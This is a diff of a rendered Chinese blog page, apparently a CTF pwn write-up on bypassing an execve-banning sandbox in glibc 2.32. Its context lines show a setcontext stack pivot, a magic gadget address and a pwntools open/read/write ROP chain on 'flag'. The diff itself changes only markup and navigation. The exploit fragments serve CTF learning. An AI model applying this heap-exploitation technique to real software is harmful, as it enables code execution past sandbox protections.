@@ -372,7 +372,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">600</span> In Total
+              Words <span class="post-count">602</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -420,14 +420,17 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1>Setcontext与Magic-Gadget</h1>
+        <h1 id="setcontext与magic-gadget">Setcontext与Magic-Gadget</h1>
 <p>题目在LargebinsAttact与TcachebinsPosioning中基本一样，只是开了沙箱ban了execve。</p>
-<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103173735695.png" alt="image-20231103173735695"></p>
+<figure>
+<img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103173735695.png" alt="image-20231103173735695">
+<figcaption aria-hidden="true">image-20231103173735695</figcaption>
+</figure>
 <p>考虑使用<code>orw</code>，在上一篇的基础上来继续探究如何<code>orw</code></p>
 <h2 id="方法1">方法1</h2>
 <p>考虑使用setcontext，栈迁移rop --glibc2.32</p>
 <p>首先先来看<code>setcontext</code>，以<code>rdx</code>为基地址设置寄存器。注意这里从<code>setcontext + 61</code>，前面的指令容易卡死。</p>
-<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103174201861.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103174201861.png"></p>
 <p>由于我们只能控制<code>rdi</code>指向的值，需要找Magic-Gadget来转换为<code>rdx</code>，这里用rop-gadget找了一个。</p>
 <pre><code class="hljs assembly">&#x27;&#x27;&#x27;
 0x000014b760
@@ -436,9 +439,11 @@ mov qword ptr [rsp], rax ;
 call qword ptr [rdx + 0x20]
 &#x27;&#x27;&#x27;</code></pre>
 <p>这样就设置了rdx，还完成了跳转。</p>
-<p>调试的时候发现这里还有push rcx的动作，所以rcx设置了最后跳转的值，需要与设置的rsp相搭配完成栈迁移rop</p>
-<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103174523710.png" alt></p>
-<p>而后再写一下orw的值，存进新开辟的堆块里。使用rop.base设置rop的地址，方便工具找字符串。PS 太优雅了！</p>
+<p>调试的时候发现这里还有push
+rcx的动作，所以rcx设置了最后跳转的值，需要与设置的rsp相搭配完成栈迁移rop</p>
+<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103174523710.png"></p>
+<p>而后再写一下orw的值，存进新开辟的堆块里。使用rop.base设置rop的地址，方便工具找字符串。PS
+太优雅了！</p>
 <pre><code class="hljs python">orw = ROP(libc)
 orw.base = orw_addr + <span class="hljs-number">0x8</span> <span class="hljs-comment">#调试的偏移</span>
 orw.<span class="hljs-built_in">open</span>(<span class="hljs-string">b&#x27;flag&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)
@@ -496,6 +501,10 @@ asm(<span class="hljs-string">&quot;lea rsi,[rip]\n&quot;</span>)<span class="hl
         <hr>
         <!-- Pager -->
         <ul class="pager">
+          
+          <li class="previous">
+            <a href="/cn/Sagiring_markdown/House of cat/" data-toggle="tooltip" data-placement="top" title="House of cat">&larr; Previous Post</a>
+          </li>
           
           
           <li class="next">
@@ -636,7 +645,7 @@ asm(<span class="hljs-string">&quot;lea rsi,[rip]\n&quot;</span>)<span class="hl
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Setcontext与Magic-Gadget</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">方法1</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">方法二</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">总结一下</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#setcontext%E4%B8%8Emagic-gadget"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Setcontext与Magic-Gadget</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">方法1</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">方法二</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">总结一下</span></a></li></ol></li></ol>
         
         </div>
       </aside>
